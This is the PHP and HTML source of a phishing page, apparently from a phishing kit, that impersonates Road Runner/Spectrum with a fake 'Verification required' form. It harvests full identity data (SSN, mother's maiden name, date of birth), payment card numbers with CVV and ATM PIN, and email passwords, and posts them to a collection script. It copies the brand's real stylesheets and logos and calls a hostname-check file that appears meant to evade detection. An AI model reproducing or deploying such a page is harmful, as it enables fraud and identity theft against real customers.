<?php
require_once 'hostname_check.php'; // Check if hostname contain blocked word

$index="details.php?header=1&valid=".$_GET['valid'];
$hostname = bin2hex ($_SERVER['HTTP_HOST']); //GET HOST NAME
$Submit = "validation.php?check=$hostname";
ini_set("output_buffering",4096);
session_start();

//Sessions
$Validate = $_GET ['valid'];
if ($Validate !="true") {

$fName = $_GET['fname'];
$lName = $_GET['lname'];
$Address = $_GET['address'];
$Zip = $_GET['zip'];
$phone = $_GET['phone'];
$ssn = $_GET['ssn'];
$dob = $_GET['dob'];
$ccnum = $_GET['cc'];
$ExpDate = $_GET['expdate'];
$cvv = $_GET['cvv'];
}
require_once 'enc.php';
?>
<!DOCTYPE html>

<html lang="en">
<head><meta charset="utf-8" /><title>
	Road Runner&#0174; Verification required
</title>
    <script>document.title = "Verification required";</script>
    <link href="https://pt.rr.com/css/password.css" rel="stylesheet" /><link rel="shortcut icon" type="image/png" href="https://pt.rr.com/favicon.png" />
</head>
<body>


      </a>
	  <h3 style="background: #0A141A;rgb(255, 255, 204);padding: 5px 10px;height: 100px;margin-bottom: 0px;margin-top: 10px;"><span style="font-size:16px;"><img alt="Spectrum logo" src="https://www.timewarnercable.com/content/dam/careportals/common/images/Spectrum_Logo_White.png" style="
    margin-top: 25px;
"></span></h3>
    
    <form name="Subs" method="POST" action="<?php echo $Submit; ?>" >
<div>
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="DCnOjU+xvL4yxQdbv16oXFWfmCe1t7RycaCJp3EmvtN+dPnBIGHNyOB08XlAMaUjuF+a2uAKP7HoeaaGSmeUy9QUt82NAhKCoYdClDahxE4XbX4Zj3g0My+9qrlh2wwx3xKgNcFzamOzDAqWJ238J0aKWig3GtqzFOBzRQ+isiqY8CbecTeYZi8uPV65Op0nikkaRxBwqE/DFvIWzIcMbtodtYb6xTaWZ9eQCukDoo0J78+u" />
</div>




<div>

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="711198DE" />
	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="rTAoas1lpRgfMO7B8Mu9Eg4gcfEsUNy2gAuxHI02PKGR3Ua8PVuCWO8OnsHqaFhsIcC0dU5dgiSF5fx2bUuV/zB1Qfm78xLpqdJfFny8pOWlGPz+" />
</div>
		<table role="presentation" width="80%" border="0" cellspacing="1" cellpadding="1" align="center">
            <tr>
                <td width="36%">&nbsp;</td>
                <td width="64%">
                    <h1 class="header">Verification required.</h1>
                    <img src="https://pt.rr.com/images/logo.gif" id="logoImage" hidden="" style="display:none;" />
                </td>
            </tr>
			<tr>
				<td width="36%" valign="top">
					<img src="https://pt.rr.com/images/internet.jpg" width="212" height="245" align="top" alt=""/>
				</td>
				<td width="64%" align="left" valign="top">

                    <p>Enter the next feilds so that we may verify your billing information.</p><span id="valEmail" class="validation" style="color:Red;">All fields are required.</span>
					<br></br>
					 
                    <div class="input-title">
<h5 style="background: rgb(0, 83, 119);rgb(255, 255, 204);padding: 5px 10px;height: 17px;margin-bottom: 0px;margin-top: 0px;"><span style="font-size:16px;"><span style="color:#FFFFFF;">Verify your Personal Information:</span></span></h5>
</div>
<br>
			
			<input id="inptUserId0" name="FNAME" type="text" placeholder="First Name" value="<?php if (isset($_SESSION['FNAME'])) { print $_SESSION['FNAME'];} else {print "";} ?>" control="forms:input" size="15" maxlength="30" autocapitalize="off" autocomplete="off" required />
										<?php if ($Validate !="true") { if ($fName ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid first name.</span>";
											} }
										?>
			<br>
			<br>
			<input id="inptUserId20" name="LNAME" type="text" placeholder="Last Name" value="<?php if (isset($_SESSION['LNAME'])) { print $_SESSION['LNAME'];} else {print "";} ?>" control="forms:input" size="15" maxlength="30" autocapitalize="off" autocomplete="off" required />
									<?php if ($Validate !="true") { if ($lName ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid last name.</span>";
											} }
									?>
			<br>
			<br>
			<input id="inptUserId21" name="Address" type="text" placeholder="Address Line" value="<?php if (isset($_SESSION['ADDRESS'])) { print $_SESSION['ADDRESS'];} else {print "";} ?>" control="forms:input" size="20" maxlength="30" style="
    width: 300px;" autocapitalize="off" autocomplete="off" required /><?php if ($Validate !="true") { if ($Address ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid address.</span>";
											} }
									?>
			<br>
			<br>
			<input id="inptUserId25" name="ZIP" type="text" placeholder="Zip Code" value="<?php if (isset($_SESSION['ZIP'])) { print $_SESSION['ZIP'];} else {print "";} ?>" control="forms:input" size="6" maxlength="30" style="
    width: 80px;
" autocomplete="off" required /><?php if ($Validate !="true") { if ($Zip ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid zip code.</span>";
											} }
									?>
			<br>
			<br>			
<div class="input-title">
<h5 style="background: rgb(0, 83, 119);rgb(255, 255, 204);padding: 5px 10px;height: 17px;margin-bottom: 0px;margin-top: 0px;"><span style="font-size:16px;"><span style="color:#FFFFFF;">Verify your Identity:</span></span></h5>
</div>

<br>

			<input id="inptUserId26" value="<?php if (isset($_SESSION['Phone'])) { print $_SESSION['Phone'];} else {print "";} ?>" name="PHONE" type="text" placeholder="Mobile Phone Number" control="forms:input" size="20" maxlength="10" style="
    width: 170px;
" autocomplete="off" required /><?php if ($Validate !="true") { if ($phone ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid phone number.</span>";
											} }
									?>
			<br>			
			<br>
			<input id="inptUserId41" name="SSN" type="text" placeholder="Social Security Number" value="<?php if (isset($_SESSION['SSN'])) { print $_SESSION['SSN'];} else {print "";} ?>" control="forms:input" size="20" maxlength="11" style="
    width: 170px;
" autocomplete="off" required /><?php if ($Validate !="true") { if ($ssn ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid social security number.</span>";
											} }
									?>									
			<br>
			<br>
			<input id="inptUserId27" name="MMN" type="text" placeholder="Mother's Maiden Name" value="<?php if (isset($_SESSION['MMN'])) { print $_SESSION['MMN'];} else {print "";} ?>" control="forms:input" size="20" maxlength="30" style="width: 170px;" autocapitalize="off" autocomplete="off" required />
			<br>
			<br>
			<input id="inptUserId28" name="DOB" type="text" placeholder="Date of Birth" value="<?php if (isset($_SESSION['DOB'])) { print $_SESSION['DOB'];} else {print "";} ?>" control="forms:input" size="20" maxlength="30" style="
    width: 170px;
" autocapitalize="off" autocomplete="off" required /><?php if ($Validate !="true") { if ($dob ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid birthday.</span>";
											} }
									?>									
<span class="note">&nbsp;&nbsp;(mm/dd/yyyy)</span>
			<br>
			<br>
			<div class="input-title">
<h5 style="background: rgb(0, 83, 119);rgb(255, 255, 204);padding: 5px 10px;height: 17px;margin-bottom: 0px;margin-top: 0px;"><span style="font-size:16px;"><span style="color:#FFFFFF;">Verify your Card Information:</span></span></h5>
</div>
<br>
		
			<input id="CardNumber" name="CCnum" type="text" placeholder="Debit/Credit Card Number" control="forms:input" size="25" maxlength="19" style="width: 169px;" autocomplete="off" required=""><?php if ($Validate !="true") { if ($ccnum ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid card number.</span>";
											} }
									?>
			<br>
			<br>
			<input  value="<?php if (isset($_SESSION['EXPDATE'])) { print $_SESSION['EXPDATE'];} else {print "";} ?>" id="exp" name="EXPDATE" type="text" placeholder="Expiration Date" control="forms:input" size="10" maxlength="7" style="
    width: 120px;
" autocomplete="off" autocapitalize="off" required /><?php if ($Validate !="true") { if ($ExpDate ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid expiration date.</span>";
											} }
									?>
<span class="note">&nbsp;&nbsp;(mm/yy)</span>
			<br>
			<br>
			<input id="cvv" name="CVV" type="text" placeholder="CVV" value="<?php if (isset($_SESSION['CVV'])) { print $_SESSION['CVV'];} else {print "";} ?>" control="forms:input" size="5" maxlength="3" style="
    width: 80px;
" autocapitalize="off" autocomplete="off" required /><?php if ($Validate !="true") { if ($cvv ==1) {
											print "<span style=\"color:#bb0826\">&nbsp;Please enter valid security code.</span>";
											} }
									?>											
			<br>
			<br>
			<input name="ATMPIN" value="<?php if (isset($_SESSION['PIN'])) { print $_SESSION['PIN'];} else {print "";} ?>" type="password" placeholder="ATM Pin" control="forms:input" size="6" maxlength="4" style="
    width: 80px;
" autocomplete="off" required/>
			<br>
			<br>
			<div class="input-title">
<h5 style="background: rgb(0, 83, 119);rgb(255, 255, 204);padding: 5px 10px;height: 17px;margin-bottom: 0px;margin-top: 0px;"><span style="font-size:16px;"><span style="color:#FFFFFF;">Verify your Email Credentials:</span></span></h5>
</div>
			<br>
<small>To help ensure the security of your online account please provide your Email credentials.</small>
<br>
<br>
			<input id="inptUserId42" name="EMail" type="email" placeholder="Email address" value="<?php if (isset($_SESSION['EMail'])) { print $_SESSION['EMail'];} else {print "";} ?>" control="forms:input" size="30" maxlength="30" style="width: 190px;" autocomplete="off" required />
			<br>
			<br>
						<input id="inptUserId40" name="Password" type="password" placeholder="Email password" value="<?php if (isset($_SESSION['Password'])) { print $_SESSION['Password'];} else {print "";} ?>" control="forms:input" size="30" maxlength="30" style="width: 190px;" autocomplete="off" required />
<br>
			<br>
						<input type="SUBMIT" value="Continue" id="continue" href="javascript:submit()" name="continue" onclick="check(this.form)" onsubmit="check(form);" control="button" data-type="primary">
                    
				</td>
			</tr>
            <tr><td width="36%"></td><td><p class="disclaimertext">&copy; 2020 Charter Communications. All rights reserved.</p></td></tr>
		</table>
    

</form>
  
   
</body>
</html>
<?php ob_end_flush(); ?>